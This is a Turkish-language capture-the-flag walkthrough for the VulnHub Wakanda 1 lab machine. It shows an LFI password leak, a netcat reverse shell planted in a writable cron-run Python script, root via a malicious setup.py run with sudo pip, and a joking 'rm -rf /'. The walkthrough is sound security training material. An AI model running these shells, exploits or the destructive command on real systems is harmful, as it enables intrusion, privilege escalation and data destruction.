# VULNHUB WAKANDA 1

![resim](/assets/vulnhub/wakanda-1/wakanda-1.png)

Bu yazımda bulnhub daki [wakanda](https://www.vulnhub.com/entry/wakanda-1,251/) 1 makinesini çözeceğiz. Makineyi indirip virtualbox'a kurduktan sonra ip adresi keşfi ile başlıyoruz.

## IP adresi keşfi

IP adresini öğrenmek için `netdiscover` aracını kullanıyoruz.

```text
root@kali:~/Downloads# netdiscover -i eth1 -r 192.168.56.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
 192.168.56.100  08:00:27:83:88:09      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:3c:1e:db      1      60  PCS Systemtechnik GmbH
```

Parametreler şu şekilde:

* `-i` interface. Bende safiyetli makine `eth1` arayüzüne bağlı.
* `-r` range. Aralık. Taranacak ip aralığı.

Artık makinemizin IP adresini biliyoruz: `192.168.56.101` .

## `nmap` ve `dirb` Taraması

```text
root@kali:~/Downloads# nmap -sS -sV -p- 192.168.56.101
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-21 09:24 EST
Nmap scan report for 192.168.56.101
Host is up (0.000086s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

Buradan açık portları görüyoruz.

* `80` http. Demek ki bir web sitesi yayınlıyor.
* `3333` ssh protokolü.
* `111` rpcbind protokolü.

Sırada dirb taraması var.

```text
root@kali:~/Downloads# dirb http://192.168.56.101/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Nov 21 09:29:45 2018
URL_BASE: http://192.168.56.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.101/ ----
+ http://192.168.56.101/admin (CODE:200|SIZE:0)
+ http://192.168.56.101/backup (CODE:200|SIZE:0)
+ http://192.168.56.101/index.php (CODE:200|SIZE:1527)
+ http://192.168.56.101/secret (CODE:200|SIZE:0)
+ http://192.168.56.101/server-status (CODE:403|SIZE:302)
+ http://192.168.56.101/shell (CODE:200|SIZE:0)

-----------------
END_TIME: Wed Nov 21 09:29:47 2018
DOWNLOADED: 4612 - FOUND: 6
```

Artık saklı dizinler ile ilgili daha fazla bilgimiz var.

## Web Sitesi Üzerinde Gezinti

![resim](/assets/vulnhub/wakanda-1/wakanda-2.png)

Siteyi ve sitenin kaynak kodunu incelediğimizde ilginç bi şey farkediyoruz.

```text
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
```

Yorum satırı haline getirilmiş. Bunu kullanmamız gerek. Siteye `http://192.168.56.101/index.php?lang=fr` şeklinde girdiğimizde sitenin dili değişiyor. Bu parametrenin dizin için kullanılıp kullanılmadığını kontrol etmeye çalışalım.

```text
http://192.168.56.101/index.php?lang=../
http://192.168.56.101/index.php?lang=index
http://192.168.56.101/index.php?lang=../../
http://192.168.56.101/index.php?lang=index.php
http://192.168.56.101/index.php?lang=fr
http://192.168.56.101/index.php?lang=fr.php
```

Bu şekilde verinin bir dosyadan çektiğini anlıyoruz. Muhtemelen dosyanın sadece ismini alıyor ve uzantısını kendiki ekliyor. Şu şekilde bir kod ile dosyalara ulaşabiliriz.

```text
http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index
```

Bu LFI (local file inclusion) açığıdır. Daha ayrıntılı bilgi için [buraya](https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion) tıklayabilirsiniz.

Buradan `index.php` sayfasının php kodunu çekeriz. Bu kodlar base64 ile kodlanmıştır. Bunu terminalden `base64 -d` komutu ile yada herhangi bir internet sitesi üzerinden decode edebilirsiniz. Decode ettikten sonra sayfanın kaynak kodunu incelersek şu şekilde bir kaç satır ile karşılaşırız.

```php
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>
```

![resim](/assets/vulnhub/wakanda-1/wakanda-3.png)

Bingoo. İşte bir parola. Bu muhtemelen `mamadou` kullanıcısının parolası. Çünkü web sayfasının altında `made by @mamadou` diye bir yazı vardı.

## ssh Bağlantısı

Nmap taramasından 3333 numaralı portun ssh için kullanıldığını biliyorduk. O zaman bu şifre ile bağlanabiliriz.

```text
root@kali:~# ssh mamadou@192.168.56.101 -p 3333
```

Bağlandıktan sonra python terminali karşımıza geldi. İstersek python kullanarak devam edebiliriz. Fakat ben `bash` i daha pratik bulduğum için `bash` e geçeceğim. Bunun için python konsolundan şu komutları girebiliriz.

```python
>>> import os
>>> os.system("bash")
```

Bash e geçtikten sonra hemen dizini listeliyorum. Ardından 1. flag karşımızda. `cat` ile yazdırabiliriz.

```txt
mamadou@Wakanda1:~$ ls
flag1.txt
mamadou@Wakanda1:~$ cat flag1.txt
Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
```

Sistemi incelemeye devam ediyorum. `passwd` dosyasına göz attıktan sonra başka bir kullanıcının olduğunu görüyorum.

```txt
mamadou@Wakanda1:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
. . .
. . .
. . .
mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python
devops:x:1001:1002:,,,:/home/devops:/bin/bash
```

En alt satırda `devops` isminde bi kullanıcı görüyorum. Bu kullanıcı ile ilgili biraz bilgi toplamaya çalışalım. Home dizinini listelediğimde 2. flag ile karşılaşıyorum. Ama okuma iznim yok.

```txt
mamadou@Wakanda1:/home/devops$ ls -al
total 24
drwxr-xr-x 2 devops developer 4096 Aug  5 02:25 .
drwxr-xr-x 4 root   root      4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root   root         9 Aug  5 02:25 .bash_history -> /dev/null
-rw-r--r-- 1 devops developer  220 Aug  1 15:23 .bash_logout
-rw-r--r-- 1 devops developer 3515 Aug  1 15:23 .bashrc
-rw-r----- 1 devops developer   42 Aug  1 15:57 flag2.txt
-rw-r--r-- 1 devops developer  675 Aug  1 15:23 .profile
```

Araştırmaya devam edelim. Bu kullanıcının diğer dosya larını inceleyelim. Şu şekilde bir komutla kullanıcıye ait dosyalar aranıp listelenebilir.

```text
mamadou@Wakanda1:/home/devops$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
```

Komutu şu şekilde açıklayalım:

* `find` dosya ve dizin aramak için kullanılan bir komut.
* `/` root klasöründen başlayarak ara.
* `-user devops` devops kullanıcısına ait dosyalar.
* `2>/dev/null` boş olmayan dosyalar demektir.

İlk iki sıradaki dosyaları inceleyelim. `/tmp/test` ve `/srv/.antivirus.py`. diğer dosyalar zaten home dizininde.

"test" dosyasını incelediğimizde içinde sadece "test" yazdığını görüyoruz. Buradan pek bi şey çıkmadı.

```text
mamadou@Wakanda1:/tmp$ cat test
testmamadou@Wakanda1:/tmp$
```

`antivirus.py` dosyasını incelediğimizde biraz ilgimizi çekiyor.

```text
mamadou@Wakanda1:/srv$ ls -al
total 12
drwxr-xr-x  2 root   root      4096 Aug  1 17:52 .
drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..
-rw-r--rw-  1 devops developer  199 Nov 21 09:02 .antivirus.py
mamadou@Wakanda1:/srv$ cat .antivirus.py
open('/tmp/test','w').write('test')
```

Bu dosya oldukça ilginç. Çünkü dosyayı okuma ve yazma yetkimiz var. Bu şu demek: dosyayı istediğimizi elde etmek için değiştirebiliriz demek. Bu dosyayı şu şekilde değiştirirsek devops kullanıcısının home dizinindeki flag2.txt dosyasını görüntüleyebiliriz.

```python
open('/tmp/test','w').write('test')

a = open("/home/devops/flag2.txt", "r").read()
open("/tmp/flag2.txt","w").write(str(a))
```

Bu şekilde dosyayı düzenledikten sonra ve birkaç dakika geçtikten sonra flag2.txt dosyasını tmp dizininin alrından okuyabiliriz.

```text
mamadou@Wakanda1:/tmp$ cat flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
```

İşte 2. flagimizide aldık.

## /var/www/html Dizini ve Bir Kaç Başarısız Deneme

Web sitesinin dizinini listeleyip bütün dosyaları inceledim. bg.jpg dosyasına bir kaç stegonography denemesi ve metadata ile bilgi bulma girişiminden sonra bu dizinden bir bilgi çıkaramadım.

```text
mamadou@Wakanda1:/var/www/html$ ls -al
total 4572
drwxr-xr-x 2 root root    4096 Aug  1 16:51 .
drwxr-xr-x 3 root root    4096 Aug  1 13:29 ..
-rw-r--r-- 1 root root       0 Aug  1 16:50 admin
-rw-r--r-- 1 root root       0 Aug  1 16:50 backup
-rw-r--r-- 1 root root 4510077 Aug  1 14:26 bg.jpg
-rw-r--r-- 1 root root  140936 Aug  1 14:07 bootstrap.css
-rw-r--r-- 1 root root    1464 Aug  1 14:29 cover.css
-rw-r--r-- 1 root root     141 Aug  1 16:45 fr.php
-rw-r--r-- 1 root root       0 Aug  1 16:50 hahaha
-rw-r--r-- 1 root root       0 Aug  1 16:51 hohoho
-rw-r--r-- 1 root root    1811 Aug  1 16:44 index.php
-rw-r--r-- 1 root root       0 Aug  1 16:50 secret
-rw-r--r-- 1 root root      40 Aug  1 16:51 secret.txt
-rw-r--r-- 1 root root       0 Aug  1 16:50 shell
-rw-r--r-- 1 root root       0 Aug  1 16:50 troll
```

## Devops Kullanıcısı ve Reverse Shell

Bu başarısız denemelerden sonra devops kullanıcısına giriş yapabileceğimi düşündüm. Bunun için bir önceki etaptaki "antivirüs.py" dosyasını tekrardan düzenlerim.

```python
open('/tmp/test','w').write('test')

a = open("/home/devops/flag2.txt", "r").read()
open("/tmp/devtxt.txt","w").write(str(a))

import os
text = "nc -e /bin/bash 192.168.56.102 3334"

os.system(text)
```

* `os` modülü işletim sisteminde kod çalıştırmak için gerekli fonksiyonları basındırıyor.
* `os.system()` fonksiyonu sisteme komut girmeyi sağlıyor.
* `nc -e /bin/bash 192.168.56.102 3334` komutu ise benim bilgisayarıma 3334 portundan bağlanıyor. Benim bilgisayarımın IP adresi 192.168.56.102. Ve ayrıca bana bash komutlarını çalıştırmamada izin veriyor. (reverse shell).

Ardından kendi bilgisayarımdan şu komutu girerek gerekli portu dinlemeye aldım.

```text
root@kali:~# nc -lvp 3334
```

Bu komutlar ile devops kullanıcısının kendi bilgisayarıma bağlanmasını sağladım. şimdi devops kullanıcısı olarak ne yapabileceğimize bakalım.

## Sudo Yetkisi ve Fakepip

Biraz kurcalamadan sonra şu komutu girdiğimde ilginç bir şeyle karşılaştım.

```text
root@kali:~# nc -lvp 3334
listening on [any] 3334 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 56579
sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

Bu kullanıcı sudo yetkisi ile `pip` komutunu çalıştırabiliyor. O zaman yapmam gereken şey `pip` komutunu değiştirmek.

İnternette biraz araştırmadan sonra [şöyle bir exploit](https://github.com/0x00-0x00/FakePip) buldum. İsmi `fakepip`. Bu exploit sisteme sudo yetkisi ile bağlanmamızı sağlıyor. Altta açıklamalarda yazan işlemleri sırasıyla yaptım.

Fakat önce bunu zafiyetli makineye yüklememiz gerekecek. Bu işlemi şu kout ile yapabilirsiniz.

```text
root@kali:~# scp -P 3333 setup.py mamadou@192.168.56.101:/home/mamadou
mamadou@192.168.56.101's password:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'scp' is not defined
lost connection
```

Ama bi sorun var. `scp` tanımlı değil diyor. Uzunca bi uğraştan ve 1 saatlik çabadan sonra sorunu buldum. Mamadou kullanıcısının varsayılan kabuk programı python. Fakat `scp` bash te çalışıyor. Bu yüzden mamadou kullanıcısının varsayılan kabuk programını değiştiriyorum.

```text
mamadou@Wakanda1:~$ chsh
Password:
Changing the login shell for mamadou
Enter the new value, or press ENTER for the default
  Login Shell [/usr/bin/python]: /bin/bash
```

Şimdi dosyamızı kopyalayabiliriz.

```text
root@kali:~# scp -P 3333 Downloads/fakePipSetup.py   mamadou@192.168.56.101:/home/mamadou/fakePipSetup.py
mamadou@192.168.56.101's password:
fakePipSetup.py                                                                                                                                                      100%  983   651.6KB/s   00:00
```

Şimdi sıra geldi dosyayı düzenleyip çalıştırmaya

## Ve İşte ROOOOOT

Dosyayı açıp kendi IP adresimizi gerekli yere girdikten ve dosyaya tüm yetkileri verdim. Bu işlemden sonra dosyayı tpg klasörünün altında fakepip dizininin altına kopyaladım.

```text
mamadou@Wakanda1:~$ chmod 777 setup.py
mamadou@Wakanda1:~$ cat setup.py
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    RHOST = '192.168.56.102'  # change this
. . .
. . .
. . .
mamadou@Wakanda1:~$ cp setup.py
```

Ardından bu kullanıcı ile dosyayı çalıştırdım. Tabi bu işlemden önce kendi bilgisayarımdan 443 numaralı portu dinlemeye aldım.

```text
root@kali:~# nc -lvp 443
```

Şimdi programı çalıştıralım.

```text
cd /tmp/fakepip
ls -al
total 12
drwxr-xr-x 2 mamadou mamadou 4096 Nov 21 15:49 .
drwxrwxrwt 8 root    root    4096 Nov 21 15:49 ..
-rwxr-xr-x 1 mamadou mamadou  983 Nov 21 15:49 setup.py
sudo /usr/bin/pip install . --upgrade --force-reinstall
Unpacking /tmp/fakepip
  Running setup.py (path:/tmp/pip-r3YAWu-build/setup.py) egg_info for package from file:///tmp/fakepip

Installing collected packages: FakePip
  Found existing installation: FakePip 0.0.1
    Uninstalling FakePip:
      Successfully uninstalled FakePip
  Running setup.py install for FakePip
```

Eğer gerekli her şeyi doğru yaptıysak reverse shell ile root kullanıcısı olarak sisteme giriş yapmış olacağız.

```text
root@kali:~/Downloads# nc -lvp 443
listening on [any] 443 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 52778
root@Wakanda1:/tmp/pip-r3YAWu-build#
```

Atrık root dizinine gidip son flagi de alabiliriz.

```text
root@kali:~/Downloads# nc -lvp 443
listening on [any] 443 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 52778
root@Wakanda1:/tmp/pip-r3YAWu-build# cd /root
cd /root
root@Wakanda1:~# ls
ls
root.txt
root@Wakanda1:~# cat root.txt
cat root.txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
```

İşte son flagimizide aldık. Bundan sonra yapmamız gereken tek şey makineyi patlatmak :) sakın kendi bilgisayarınızda denemeyin. Sizin bilgisayarınızda patlar :)

```text
root@Wakanda1:/tmp/pip-r3YAWu-build# rm -rf /
. . .
. . .
. . .
```

Bu yazım burada biyiyor. Sonraki makinelerde görüşmek üzere. Başarılar dilerim...
